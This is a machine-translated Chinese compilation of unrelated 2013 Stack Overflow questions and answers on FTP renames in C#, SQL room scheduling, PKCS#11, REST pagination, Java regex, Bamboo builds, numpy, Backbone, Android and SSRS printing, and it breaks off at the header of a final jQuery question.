> 赞同：1
> 
> 时间：2013-03-06T10:08:06.850
> 
> 标签：c#, ftp, ftpwebrequest

我已经构建了一个控制台应用程序，可以从远程 FTP 读取和移动文件。在我将代码部署到生产环境之前，一切都很顺利。

当我连接到 FTP 时，我首先要求的是在两种环境中都可以使用的 listDirectory。之后我尝试从根目录移动文件，但这仅适用于开发环境！？在生产中我得到以下错误代码：“*远程服务器在处理中返回错误（451）本地错误*”

这是移动一个文件的代码：

```
var uri = new Uri("ftp://ftp.example.com/test.xml");
var request = (FtpWebRequest)WebRequest.Create(uri);

request.Credentials = new NetworkCredential(_username, _password);
request.UsePassive = true;
request.Method = WebRequestMethods.Ftp.Rename;
request.RenameTo = "/folder/test.xml";

(FtpWebResponse)request.GetResponse(); 
```

还应该提到我能够使用命令行在生产中移动文件：

> ftp ftp.example.com
> 
> 用户名： .....
> 
> 密码： .....
> 
> 重命名 test.xml /文件夹/test.xml
> 
> 250 文件重命名或移动成功

我的想法已经用完了，因此感谢所有帮助！

PS。我在两个环境中使用相同的凭据连接到同一个 FTP 主机，并且我还可以在两个环境中读取文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-05T21:53:48.577

我遇到过同样的问题。在我们的例子中，它是 .Net Framework 的版本。安装了 4.0 的服务器出现“(451) local error in processing”错误。那些有4.5的。安装运行没有问题。所以我们在我们的应用服务器上安装了 .Net Framework 4.5 并解决了这个问题。

# c# - 检查房间可用性

> ID：15244313
> 
> 赞同：1
> 
> 时间：2013-03-06T10:08:08.397
> 
> 标签：c#, sql, sql-server, logic

如果用户在上午 7:00-12:00NN 在该房间添加事件，则代码如下。所以当时应该不可用，但我的代码只读取开始时间和结束时间，有什么建议吗？

```
public bool checkSched(string start, string endtime, string room, string day)
{

    myCon.Open();
    SqlDataReader dr;
    bool found = false;

    SqlCommand cmd = new SqlCommand("SELECT * FROM Subject WHERE (Starting_Time=@start OR Ending_Time = @endtime) AND (Room = @room) AND (Day=@day)", myCon);
    cmd.Parameters.Add("@start", SqlDbType.NVarChar).Value = start;
    cmd.Parameters.Add("@room", SqlDbType.NVarChar).Value = room;
    cmd.Parameters.Add("@day", SqlDbType.NVarChar).Value = day;
    cmd.Parameters.Add("@endtime", SqlDbType.NVarChar).Value = endtime;

    dr = cmd.ExecuteReader();

    found = dr.HasRows;
    myCon.Close();
    return found;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:22:40.093

不确定，如果我正确理解了您的意图，但是如果您想检查 and 之间是否有任何事件重叠`@start`，`@endtime`您应该使用`BETWEEN`：

```
SELECT * FROM Subject WHERE (
(Starting_Time BETWEEN @start AND @endtime) 
OR 
(Ending_Time BETWEEN @start AND @endtime)
) AND (Room = @room) AND (Day=@day) 
```

请参阅[`BETWEEN`MSDN](http://msdn.microsoft.com/en-us/library/ms187922.aspx)了解`BETWEEN`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:32:52.510

首先，您需要将开始和结束时间的 sql 结果字符串转换为 DateTime 类型。

```
 //start and end time from the room stored in the DB
 DateTime startTimeDB;
 DateTime endTimeDB;

 DateTime.TryParse(dateString, out startTime)
 DateTime.TryParse(dateString, out endTime) 
```

检查此链接以获取更多信息：[MSDN DateTime.TryParse](http://msdn.microsoft.com/de-de/library/vstudio/system.datetime.tryparse.aspx)

您还在方法参数中使用字符串作为开始和结束时间，是否可以在那里使用 DateTime 类型？否则，您还需要将参数字符串解析为 DateTime 对象：

```
 //start and end time for your new event
 DateTime startTimeNew;
 DateTime endTimeNew;

 DateTime.TryParse(start, out startTimeNew)
 DateTime.TryParse(endtime, out endTimeNew) 
```

在尝试这样的事情之后：

```
if (startTimeNew.Ticks > startTime.Ticks && endTimeNew.Ticks < endTime.Ticks)
{
    return false;
}
return true 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:21:28.160

您想要一个在开始时间和结束时间之间占用的房间。最简单的方法是检查开始时间是否在任何 Starting_Time 和 Ending_Time 之间。

```
Starting_Time < @start AND Ending_Time > @start 
```

但这只是一半的工作。您还想要在@start 和@end（甚至更晚）之间预订并结束的房间。我想你可以找出额外的情况。

注意：在您的数据库中设置 Starting_Time 和 Ending_Time 日期。

# security - PKCS11 中的“机制”是什么？

> ID：15244318
> 
> 赞同：3
> 
> 时间：2013-03-06T10:08:25.273
> 
> 标签：security, rsa, digital-signature, pkcs#11

PKCS11中的*机制*是什么意思？例如：`CKM_RSA_PKCS`。

`CKM_RSA_PKCS`机制（ ）和签名算法（ ）有什么区别`NoneWithRSA`？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-06T16:31:47.743

机制是描述加密操作的常数值。例如，`CKM_RSA_PKCS`在 PKCS #11 手册中定义为：

> PKCS #1 v1.5 RSA 机制，表示为**CKM_RSA_PKCS**，是一种基于 RSA 公钥密码系统和最初在 PKCS #1 v1.5 中定义的块格式的多用途机制。支持单部分加解密；带和不带消息恢复的单部分签名和验证；密钥包装；和密钥解包。此机制仅对应于 PKCS #1 v1.5 中涉及 RSA 的部分；它不计算 PKCS #1 v1.5 中为`md2withRSAEncryption`和算法指定的消息摘要或 DigestInfo 编码。`md5withRSAEncryption`

请注意“多用途”子句——这种单一机制可用于加密/解密以及签名/验证。

Java 机制`NoneWithRSA`定义[为](http://docs.oracle.com/javase/6/docs/technotes/guides/security/StandardNames.html#Signature)：

> 在执行 RSA 操作之前不使用摘要算法（例如 MD5/SHA1）的 RSA 签名算法。有关 RSA 签名算法的更多信息，请参阅 PKCS1。

Java 机制仅适用于签名。

从描述来看，用`NoneWithRSA`Java 计算的签名似乎等同于用 PKCS #11 计算的签名`CKM_RSA_PKCS`。

# rest - 如何确保分页 REST API 中的数据完整性？

> ID：15244320
> 
> 赞同：2
> 
> 时间：2013-03-06T10:08:26.797
> 
> 标签：rest

我目前正在研究 REST API。API返回的资源预计是来自数据库的海量数据（DB中的数千万行）。分页是必须的，以避免在将数据写入 HTTP 响应时消耗大量内存。

在客户端请求之间删除/添加数据库中的行时，如何确保数据完整性？

例如：

```
page 1: [ John, Mary, Harry, David, Joe ]
page 2: [ Mike, Don, Alex ] 
```

客户端请求第1页并将其存储在本地（文件/内存）中后，在请求第2页之前，数据变为：

```
page 1: [ John, Mary, Harry, David, **Mike** ]
page 2: [ Don, Alex, **Terry** ] 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-08T09:00:11.517

一个真正的 RESTful（因此是服务器端无状态）答案是：

*   询问前五条记录（最后一条是“Joe”），
*   然后要求五个记录优于“乔”，[1]，
*   等等。

使用此策略，您将在第 2 页中获得“Mike”和“Terry”。

[1] 它们必须具有排序顺序（字母顺序或其他顺序）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-08T03:46:03.627

对此的一种解决方案是返回一个表示查询结果集的“临时”资源，然后允许客户端使用 GET 对其进行分页。

例如：

```
GET /big-query/all-users
Returns: /query-results/12345 

GET /query-results/12345?page=1
Returns: users 1-20

GET /query-results/12345?page=2
Returns: users 21-40 
```

此解决方案的明显问题是对实际用户的更改不会反映在查询结果集中，因此您应该在 API 文档中明确说明。此外，最好在合理的时间后使结果集“过期”，以 (a) 防止它变得陈旧，以及 (b) 允许您的服务器获取它所持有的内存。

另一种方法是每次重新发出查询，然后分页到结果集中以找到要返回的正确数据块。这是无状态的，不需要像之前的想法那样的驱逐策略，但这确实意味着每次都会重新运行查询。它的好处是每次分页的结果都将尽可能准确。

# java - 括号之间提取内容中的 Java 模式匹配

> ID：15244324
> 
> 赞同：0
> 
> 时间：2013-03-06T10:08:47.723
> 
> 标签：java, regex

需要提取括号之间的内容 for `(20)`- 应该返回`20` for `("creamy")`- 应该返回`creamy`

我尝试使用下面的模式匹配器，但没有奏效。有人可以帮忙吗？

```
Pattern pattern = Pattern.compile("\\((.*?)\\)"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:16:40.437

您是否在单个 \ 上遇到编译器错误？为了在 Java 中编译，您需要转义反斜杠，否则编译器会尝试找到特殊字符 (。所以它应该是：

```
Pattern pattern = Pattern.compile("\\((.*?)\\)");
Matcher match = pattern.matcher("(cream)");
match.find();
System.out.println(match.group(1)); 
```

打印出来

```
cream 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:13:27.483

尝试在java中使用正则表达式。请参阅下面的代码片段。

```
String matched = "";
Pattern pattern = Pattern.compile("\\((.*?)\\)");
Matcher matcher = pattern.matcher("(20)");
if (matcher.find()) {
   matched = matcher.group(1);
}
System.out.println(matched); 
```

# visual-studio-2010 - 使用 Bamboo 构建 .sln 时系统找不到路径

> ID：15244325
> 
> 赞同：0
> 
> 时间：2013-03-06T10:08:47.953
> 
> 标签：visual-studio-2010, bamboo

我正在尝试使用 Bamboo 附带的 Visual Studio 任务来构建我们的 Visual Studio 2010 解决方案的项目。但是一旦构建开始，它就无法找到所需的文件（请参阅下面的日志文件）。

当我尝试在命令行中构建项目时，它工作正常。但是，当我尝试使用 Bamboo 的“命令”任务执行此操作时，会遇到与 Visual Studio 任务相同的错误。

所以我收集我的文件检查得很好，问题出在 Bamboo 上。看到问题仅在 moc'ing、uic'ing 或 rcc'ing 时发生，我认为这可能是与 Qt 相关的问题。虽然所有可执行文件（moc.exe、uic.exe ...）都在我的 PATH 中，但我看不出它们是如何找不到的。

* * *

这是失败构建的日志文件：它是德语的，所以你应该知道“Das System kann den angegebenen Pfad nicht finden”。表示系统找不到指定的路径。

```
simple  01-Mrz-2013 13:47:32    Build TEST-TEST01-BUILD-83 started building on            agent Default Agent
simple  01-Mrz-2013 13:47:32    Build working directory is C:\Users\Fujitsu\bamboo-home\xml-data\build-dir\TEST-TEST01-BUILD
simple  01-Mrz-2013 13:47:32    Executing build TEST-TEST01-BUILD-83
simple  01-Mrz-2013 13:47:32    Running pre-build action: Build Number Stamper
simple  01-Mrz-2013 13:47:32    Running pre-build action: Clover Grails PreBuild   Action
simple  01-Mrz-2013 13:47:32    Running pre-build action: VCS Version Collector
simple  01-Mrz-2013 13:47:32    Running pre-build action: Repository Isolation Enabler Action
simple  01-Mrz-2013 13:47:32    Running pre-build action: Maven Settings Prebuild     Action
simple  01-Mrz-2013 13:47:32    Starting task 'Build Project with IDE' of type 'com.atlassian.bamboo.plugin.dotnet:devenv'
command 01-Mrz-2013 13:47:32    Beginning to execute external process for build 'TestProject - TestPlan_01 - Build Project'\n ... running command line: \nC:\Users\Fujitsu\bamboo-home\DotNetSupport\devenvrunner.bat C:\Users\Fujitsu\bamboo-home\xml-data\build-dir\TEST-TEST01-BUILD c:\Program Files (x86)\Microsoft Visual Studio 10.0 x86 C:\Users\Fujitsu\bamboo-home\xml-data\build-dir\TEST-TEST01-JOB1\monalysis\MonAlysis\MonAlysis.sln /build Debug /project Core\n ... in: C:\Users\Fujitsu\bamboo-home\xml-data\build-dir\TEST-TEST01-BUILD\n
build   01-Mrz-2013 13:47:32    "c:\Program Files (x86)\Microsoft Visual Studio   10.0" 
build   01-Mrz-2013 13:47:32    
build   01-Mrz-2013 13:47:32    C:\Users\Fujitsu\bamboo-home\xml-data\build-dir\TEST-TEST01-BUILD>call "c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\vcvarsall.bat" x86 
build   01-Mrz-2013 13:47:32    Setting environment for using Microsoft Visual Studio 2010 x86 tools.
build   01-Mrz-2013 13:47:35    
build   01-Mrz-2013 13:47:35    Microsoft (R) Visual Studio Version 10.0.30319.1.
build   01-Mrz-2013 13:47:35    Copyright (C) Microsoft Corp. Alle Rechte vorbehalten.
build   01-Mrz-2013 13:47:35    1>------ Erstellen gestartet: Projekt: Core, Konfiguration: Debug Win32 ------
build   01-Mrz-2013 13:47:36    1>Der Buildvorgang wurde am 01.03.2013 13:47:36 gestartet.
build   01-Mrz-2013 13:47:36    1>InitializeBuildStatus:
build   01-Mrz-2013 13:47:36    1>  Aktualisieren des Timestamps von "C:\Users\Fujitsu\bamboo-home\xml-data\build-dir\TEST-TEST01-JOB1\monalysis\MonAlysis\Core\GeneratedFiles\Debug\Core.unsuccessfulbuild".
build   01-Mrz-2013 13:47:36    1>CustomBuild:
build   01-Mrz-2013 13:47:36    1>  Das System kann den angegebenen Pfad nicht finden.
build   01-Mrz-2013 13:47:36    1>  Uic'ing Source\About.ui...

... (The same error happens for all the files, but only when Uic'ing, Moc'ing or Rcc'ing)

build   01-Mrz-2013 13:47:37    1>C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\Microsoft.CppCommon.targets(151,5): error MSB6006: "cmd.exe" wurde mit dem Code 3 beendet.
build   01-Mrz-2013 13:47:37    1>
build   01-Mrz-2013 13:47:37    1>Fehler beim Erstellen
build   01-Mrz-2013 13:47:37    1>
build   01-Mrz-2013 13:47:37    1>Verstrichene Zeit 00:00:00.57
build   01-Mrz-2013 13:47:37    ========== Erstellen: 0 erfolgreich, Fehler bei 1, 0 aktuell, 0 ?bersprungen ==========
simple  01-Mrz-2013 13:47:39    Failing task since return code was 1 while expected 0
simple  01-Mrz-2013 13:47:39    Finished task 'Build Project with IDE'
simple  01-Mrz-2013 13:47:39    Running post build plugin 'NCover Results Collector'
simple  01-Mrz-2013 13:47:39    Running post build plugin 'Clover Results Collector'
simple  01-Mrz-2013 13:47:39    Running post build plugin 'Artifact Copier'
simple  01-Mrz-2013 13:47:39    Running post build plugin 'Cleanup Build Processor'
simple  01-Mrz-2013 13:47:39    Finalising the build...
simple  01-Mrz-2013 13:47:39    Stopping timer.
simple  01-Mrz-2013 13:47:39    Build TEST-TEST01-BUILD-83 completed.
simple  01-Mrz-2013 13:47:39    Running on server: post build plugin 'NCover Results Collector'
simple  01-Mrz-2013 13:47:39    Running on server: post build plugin 'Clover Delta Calculator'
simple  01-Mrz-2013 13:47:39    Running on server: post build plugin 'Build Hanging Detection Configuration'
simple  01-Mrz-2013 13:47:39    Running on server: post build plugin 'Maven Dependencies Postprocessor'
simple  01-Mrz-2013 13:47:39    All post build plugins have finished
simple  01-Mrz-2013 13:47:39    Generating build results summary...
simple  01-Mrz-2013 13:47:39    Saving build results to disk...
simple  01-Mrz-2013 13:47:39    Indexing build results...
simple  01-Mrz-2013 13:47:39    Finished building TEST-TEST01-BUILD-83. 
```

* * *

**更新：**

问题不是找不到文件，而是 Bamboo 找不到 moc.exe、uic.exe 和 rcc.exe。它们位于 PATH 中，这足以从命令行构建它。然而，Bamboo 似乎没有使用 PATH。

所以我能做的最好的就是通过批处理文件手动进行 moc'ing、uic'ing 和 rcc'ing 的解决方法。

然而，一般问题仍然存在，这也可能是[我的另一个问题](https://stackoverflow.com/questions/15268612/fatal-error-lnk1104-cant-open-lnkn-tmp)的原因。
因此，请发表您对如何告诉 Bamboo 在哪里找到 moc/uic/rcc.exe 的任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-04T14:29:11.363

在您的任务配置中，您可以设置 Bamboo 应该使用的环境变量

例如：

```
PATH="C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\bin\amd64" 
```

这是我在构建 bat 文件中所做的（请参阅下面的评论）

```
C:\Qt\Qt5.0.2\5.0.2\msvc2012_64\bin\qmake.exe  C:\bhome\xml-data\build-dir\...\project.pro  -r  -spec  win32-msvc2012  "CONFIG+=debug"  "CONFIG+=declarative_debug"  "CONFIG+=qml_debug"
call "C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\bin\amd64\vcvars64.bat"
C:\Qt\Qt5.0.2\Tools\QtCreator\bin\jom.exe -f Makefile.Debug 
```

# python - Python：将浮点数字符串解包为复数

> ID：15244327
> 
> 赞同：2
> 
> 时间：2013-03-06T10:08:53.000
> 
> 标签：python, arrays, struct

我对编码相当陌生，我正在从二进制文件中读取信号。数据定向为两个 4 字节浮点数，组成一个复数，这会重复多达 1500 个条目

我一直在使用 for 循环来提取数据并将复数附加到数组中

```
for x in range(dimX):
    for y in range(dimY):
        complexlist=[]
        #2 floats, each 4 bytes, is one complex number
        trace=stream.readBytes(8*dimZ)
        #Unpack as list of floats
        floatlist=struct.unpack("f"*2*dimZ,trace)
        for i in range(0,len(floatlist)-1,2):
            complexlist.append(complex(floatlist[i],floatlist[i+1]))        
        data[x][y]=np.array(complexlist) 
```

其中 dimX 可能是数千个，DimY 通常 <30 而 dimZ 是 <1500

但这在大文件中非常缓慢

有没有办法读取整个跟踪的缓冲区并直接解压缩到复数数组？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:57:05.280

就在这里。您可以跳过 python 的复杂类型的步骤，因为在内部，numpy 将`n`复数数组表示为`2n`浮点数组。

下面是一个来自 REPL 的简单示例，说明它是如何工作的：

```
>>> import numpy as np
>>> a = np.array([1.,2.,3.,4.])
>>> a
array([ 1.,  2.,  3.,  4.])
>>> a.dtype
dtype('float64')
>>> a.dtype = complex
>>> a
array([ 1.+2.j,  3.+4.j])
>>> 
```

请注意，如果初始数组有一个`dtype`以外的`float`.

```
>>> a = np.array([1,2,3,4])
>>> a
array([1, 2, 3, 4])
>>> a.dtype
dtype('int64')
>>> a.dtype = complex
>>> a
array([  4.94065646e-324 +9.88131292e-324j,
         1.48219694e-323 +1.97626258e-323j])
>>> 
```

在你的情况下。您想要的 dtype 是`np.dtype('complex64')`因为您的每个复数都是 64 位（2*4*8）。

```
for x in range(dimX):
    for y in range(dimY):
        #2 floats, each 4 bytes, is one complex number
        trace=stream.readBytes(8*dimZ)
        a = np.frombuffer(trace,dtype=np.dtype('complex64'))
        data[x][y] = a 
```

这应该会加快你的速度。`numpy.frombuffer()`这是 REPL 中关于如何工作的示例

```
>>> binary_string = struct.pack('2f', 1,2)
>>> binary_string
'\x00\x00\x80?\x00\x00\x00@'
>>> numpy.frombuffer(binary_string, dtype=np.dtype('complex64'))
array([ 1.+2.j], dtype=complex64)
>>> 
```

编辑：我不知道`numpy.frombuffer()`. 所以我创建了一个字符数组，然后更改 dtype 以获得相同的效果。谢谢@wim

编辑2：

至于进一步的速度优化，您可能会通过使用列表理解而不是显式的 for 循环来提高性能。

```
for x in range(dimX):
    data[x] = [np.frombuffer(stream.readBytes(8*dimZ), dtype=np.dtype('complex64')) for y in range(dimY)] 
```

而且还升级了：

```
data = [[np.frombuffer(stream.readBytes(8*dimZ), dtype=np.dtype('complex64'))
         for y in range(dimY)]
         for x in range(dimX)] 
```

# javascript - 无法通过 CID 在 Backbone 集合中获取模型

> ID：15244330
> 
> 赞同：0
> 
> 时间：2013-03-06T10:08:59.497
> 
> 标签：javascript, backbone.js, backbone.js-collections

我在主干中有以下模式/集合/视图设置。

```
var Card = {};  

//card model
Card.Model = Backbone.Model.extend();

//collection
Card.Collection = Backbone.Collection.extend({
    url: '/api/cards',
    model: Card.Model
});

//column view
Card.MainView = Backbone.View.extend({
        className: 'column',
        append: function(model) {
            var view = Card.View.extend({ 
                model : model,
                attributes: { cid : model.cid } 
            });
            var v = new view();
            this.$el.append(v.el);          
        },
        initialize: function() {
            var self = this;
            _.bindAll(this, "sortable");
            this.collection.fetch({ 
                success: function() { 
                    self.render(); 
                } 
            });
        },
        render: function() {
            var self = this;
            for(var i = 0; i < this.columns.length; i++) {
                var col = this.columns[i];
                var column = Card.ColumnView.extend({
                    data: col,
                    cards: self.collection.where({ position : col.position })
                });
                var col = new column();
                this.$el.append(col.el);
            }               
            this.sortable();
        },
        sortable: function() {
            var self = this;
            $(this.el).find('.card-container').sortable({
                connectWith: '.card-container',
                receive: _.bind(function(event, ui) { 
                    var cid = $(ui.item).attr('cid');
                    var card = self.collection.get(cid);
                    //console.log(self.collection.last());
                    console.log('cid', self.collection.get(cid));
                    console.log('index 1', self.collection.at(1));
                    console.log('last', self.collection.last());
                    console.log('collection', self.collection);
                }, this)

            });
        }
}); 
```

当我尝试从`sortable`函数中的 MainView 集合中获取模型时，它不会按 CID 记录模型。我得到以下输出。

```
cid undefined CardMetaCollection.js:97
index 1 d {collection: d, attributes: Object, _escapedAttributes: Object, cid: "c2", changed: Object…} CardMetaCollection.js:98
last d {collection: d, attributes: Object, _escapedAttributes: Object, cid: "c249", changed: Object…} CardMetaCollection.js:99
collection d {length: 249, models: Array[249], _byId: Object, _byCid: Object, url: "/api/cards"…} 
```

我已经尝试登录`success`fetch 方法的回调，但我仍然得到未定义的返回......每个模型都有自己的 cid。任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-04-13T09:53:28.697

该`.get()`方法接受`id`或`cid`。`id`可以直接传递给，`get`但`cid`必须作为*对象字面*量传递。实际上，您也可以传入`id`一个对象文字并让您的代码保持一致。

```
var cid = ...;
var card = self.collection.get({ cid: cid });

var id = ...;
var card = self.collection.get({ id: id });

var id = ...;
var card = self.collection.get(id); 
```

您可以查看`.get()`backbone.js 中的实现。

**更新**：`cid`单独可以传递给`.get()`Backbone 0.9.9 或更高版本中的方法（参见[当前 1.3.3 中的实现](https://github.com/jashkenas/backbone/blob/1.3.3/backbone.js#L985)）。

```
var cid = ...;
var card = self.collection.get(cid); 
```

在您的情况下，问题可能出在卡片元素上缺少属性“cid”，正如[Ben](https://stackoverflow.com/users/348314/ben)所写。您声明了一个`.append()`将此属性添加到新元素的方法，但您`new column()`在`.render()`方法中调用而不是调用它。看来，该`column`视图没有添加该属性，因为您的日志记录找到它`undefined`。

注意：例如，考虑使用有效的自定义 HTML 属性名称，例如“data-cid”，而不仅仅是“cid”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:51:15.197

*   确保`cid`您传入`self.collection.get(cid)`的是任何一个模型的 id，因为`collection.get`期望模型 id 作为参数。为此，您可能还想记录该`cid`值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-22T13:40:53.790

当您将不同的模型推送到一个集合并且休息时使用 cid 不对所有请求单独响应唯一 ID，或者 REST 不返回 ID attr 或者我们想要创建没有休息的假模型并将其推送到集合

```
 var banned = app.request('rest:banList');
  var whiteIp = app.request("rest:inviteList");
   var whiteGroup = app.request("rest:groupList");
            $.when(banned, whiteIp, whiteGroup).done(function (bannedList,  whiteIpList, whiteGroupList) {
                debugger
                var arr = new Backbone.Collection();
                arr.add(bannedList);
                arr.add(whiteIpList);
                arr.add(whiteGroupList);

            });

define(["app"], function (app) {
    var API = {
        getWho: function (data) {
            var whois = new Backbone.Model();
            whois.url = '/admin/whois';
            whois.cid = 'ban';
            var defer = $.Deferred();

            whois.fetch({
                type: 'GET',
                data: data,
                success: function(data){
                    debugger
                    defer.resolve(data);
                },
                error: function(data){
                    defer.reject(data);
                }
            });
            return defer.promise();
        }
    };

    app.reqres.setHandler("rest:getWho", function (data) {
        return API.getWho(data);
    });
}); 
```

# android - 如何在列表中保留切换按钮的状态？

> ID：15244331
> 
> 赞同：1
> 
> 时间：2013-03-06T10:09:02.017
> 
> 标签：android, listview, togglebutton

我有一个带有切换按钮的列表（项目数量不确定）。每次我按下后退按钮并再次进入该页面时，所有切换按钮都会在 xml 中变为关闭状态。我怎样才能得到切换按钮的位置和“setChecked”呢？或任何检查我之前检查过的切换按钮的方法（设置为 ON）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:18:57.633

用于`onPause()`保存切换按钮的状态：

```
 bundle.putBoolean("ToggleButtonState", toggleButton.isChecked()); 
```

用于`onResume()`检索切换按钮的状态：

```
 toggleButton.setChecked(bundle.getBoolean("ToggleButtonState",false)); 
```

# android - 在另一个 JNI 库中加载 JNI 库崩溃

> ID：15244333
> 
> 赞同：1
> 
> 时间：2013-03-06T10:09:02.703
> 
> 标签：android, java-native-interface, jniwrapper

我本质上是在尝试遵循[此处](https://stackoverflow.com/questions/10649119/calling-native-method-twice-of-third-party-library-in-an-activity-causes-the-and)描述的 SO 解决方案，但遇到了问题。

这基本上就是我在 JNI 库中所做的事情：

```
handle = dlopen("/data/data/lib/my.package/lib/myLibrary.so", RTLD_LAZY);
myFunctionName = (func)dlsym(handle, "main");
(*myFunctionName)(numberOfArgs, arguments); 
```

问题是上述只有在

```
System.loadLibrary("myLibrary") 
```

从调用 JNI 的相同 Java 代码调用。但这显然违背了通过 dlopen 加载库的目的。

我从 LocCat 得到的只是

```
A/libc(29472): Fatal signal 11 (SIGSEGV) at 0x00000000 (code=1) 
```

出了什么问题？它与 myLibrary.so 的构建参数有关吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T18:22:06.400

在使用 dlerror() 诊断问题后，我实际上发现 dlopen 失败了。转的路径错了。它应该是：

```
handle = dlopen("/data/data/my.package/lib/myLibrary.so", RTLD_LAZY); 
```

# android - 如何在本地联系人应用程序中让自定义帐户像 Google/LinkedIn/Facebook 一样显示？

> ID：15244334
> 
> 赞同：1
> 
> 时间：2013-03-06T10:09:06.033
> 
> 标签：android, android-contacts, accountmanager, android-syncadapter

我目前正在开发一个应用程序，我们将从我们自己的应用程序中添加联系人，类似于 LinkedIn 的连接方式和 Facebook 的好友方式。因此，我们想要我们的自定义帐户，如下图所示（作为“ *MyAppName* ”），其中包含从我们的应用程序添加的联系人：

![](../Images/df74667ce6323ebfed8e5626d04e03f2.png) ![](../Images/c9c84fdc7f638150ec6025d55b7ab11f.png)

我们目前有一个`SyncAdapter`从第一张图片中看到的，只是希望它显示在联系人应用程序中。我们一直在查看文档，但找不到任何具体的内容。

这不是添加联系人，而是让帐户显示在“*帐户*”下的联系人应用程序中。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T10:36:49.393

在研究了 Budius 的建议之后，我终于想出了如何去做。[这](http://developer.android.com/guide/topics/providers/contacts-provider.html#Groups)是文档中所述位置的更精确链接。基本上你只需要让你的帐户可见。除此之外，我在[这里](https://stackoverflow.com/a/4361329/1882855)找到了如何做到这一点的答案。

```
ContentProviderClient client = getContentResolver().acquireContentProviderClient(ContactsContract.AUTHORITY_URI);
ContentValues values = new ContentValues();
values.put(ContactsContract.Groups.ACCOUNT_NAME, account.name);
values.put(Groups.ACCOUNT_TYPE, account.type);
values.put(Settings.UNGROUPED_VISIBLE, true);
try
{
   client.insert(Settings.CONTENT_URI.buildUpon().appendQueryParameter(ContactsContract.CALLER_IS_SYNCADAPTER, "true").build(), values);
}
catch (RemoteException e)
{
   e.printStackTrace();
} 
```

此代码的所有功劳[归于 Henry Pushel](https://stackoverflow.com/users/418891/henry-pushel)。

# objective-c - NSString 到 NSData 的字节？

> ID：15244335
> 
> 赞同：0
> 
> 时间：2013-03-06T10:09:06.203
> 
> 标签：objective-c

我需要转换`NSString`为字节-通过 tcp 发送。

```
 NSString *dataS= @"ran"; // is in byte  114 97 110 
```

但是如果我使用它`NSData`来转换它（我最后需要它作为 NSData，因为我要添加多个 NSData）：

```
NSData *requestData = [dataS dataUsingEncoding:NSUTF8StringEncoding]; 
```

我得到：`<72616e>`记录解决方案时。它不是真的。我可能在这里遗漏了一些东西。

使用 :`[ToSend characterAtIndex:k]`进行转换，给出整数-我想使用 NSData 进行转换。我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:14:03.200

您以正确的方式转换字符串。`requestData`包含三个字节。在输出中，这些字节显示为十六进制：十六进制的 72 是十进制的 114，十六进制的 61 是十进制的 97，十六进制的 6e 是十进制的 110。

要将字节传递给较低级别​​的方法，您可以通过调用获取数据长度，`[requestData length]`并通过调用获取指向字节的指针`[requestData bytes]`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:12:52.490

您做得对，日志记录显示它是这样的，因为这是记录器为输出格式化它的方式，仅此而已。

以字节为单位的 114 97 110 是十六进制的 <72616e>。

# printing - 横向或纵向打印自动旋转文本，SSRS

> ID：15244336
> 
> 赞同：0
> 
> 时间：2013-03-06T10:09:06.043
> 
> 标签：printing, reporting-services, orientation, axapta, dynamics-ax-2012

我们在 SSRS（版本 11.0.2100，嵌入 AX 2012 客户端）中有一个 80 毫米 X 60 毫米的报告，它毫无问题地出现在屏幕上，但是当直接打印到标签打印机时，输出旋转 90º 并缩小以适合标签。然而，导出为 PDF 似乎没问题，而且这不是链接报告，[它还有另一个错误](https://stackoverflow.com/questions/11455476/ssrs-2008-r2-printing-in-portrait-rather-than-landscape-from-report-server-lin?rq=1)。 ![横向报告](../Images/42719784766f605126ecc230707153a5.png)

我尝试将所有东西旋转 90º 作为测试，但结果是一样的 ![垂直报告](../Images/df7f65feeaf6d4d4d2135ca698e4b603.png)

我不知道这是否是一个问题：

*   SSRS 报告的参数化？
*   通过远程桌面打印的问题？
*   目标设备 EasyCoder PF4i 打印机出现问题。
*   检查[打印首选项](http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/0bbc1d76-6207-4be4-8691-73df9f7efb97)。尤其是“[始终使用驱动程序设置](http://social.msdn.microsoft.com/forums/en-us/sqlreportingservices/thread/15552161-F3EF-4E78-BE7E-8B4595151F48)”或“[直接打印到打印机](http://social.msdn.microsoft.com/forums/en-US/sqlreportingservices/thread/e6f29862-9893-410d-88b5-905db40b1607)”选项。

笔记：

1.  [重复的问题](https://stackoverflow.com/questions/1889698/ssrs-2005-how-to-print-4-x-3-label-as-portrait-ssrs-assumes-landscape)，有一些有趣的解决方案。
2.  [SSRS8 导出到 Word 时出现类似问题？](https://stackoverflow.com/questions/978734/ssrs-2008-word-export-doesnt-print-to-landscape).
3.  还需要[更新我的打印机驱动程序](https://stackoverflow.com/a/3762418/15530)。
4.  始终检查 SSRS 版本与 SQL 版本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-09T13:50:52.463

更新 EasyCoder PF4i 打印机和 EasyCoder PF4i 打印机驱动程序显然解决了这个问题。

# javascript - 在 $("#string") 中添加字符串

> ID：15244337
> 
> 赞同：2
> 
> 时间：2013-03-06T10:09:10.330
> 
